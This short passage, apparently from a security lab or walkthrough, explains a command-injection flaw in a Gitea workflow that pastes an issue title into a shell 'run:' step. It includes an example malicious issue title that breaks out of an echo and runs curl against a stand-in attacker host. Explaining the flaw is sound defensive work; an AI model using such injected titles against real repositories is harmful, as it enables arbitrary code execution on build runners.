The workflow uses `${{ github.event.issue.title }}` directly in a
`run:` block. This means the issue title is pasted into a shell command
before execution.

Look at the vulnerable workflow:

```bash
cat /repos/wl-webapp/.gitea/workflows/issue-handler.yml
```

The `run:` block does:
```yaml
run: echo "Processing issue: ${{ github.event.issue.title }}"
```

An issue title like `"; curl http://attacker.com/pwn; echo "` breaks
out of the echo command and executes arbitrary code.
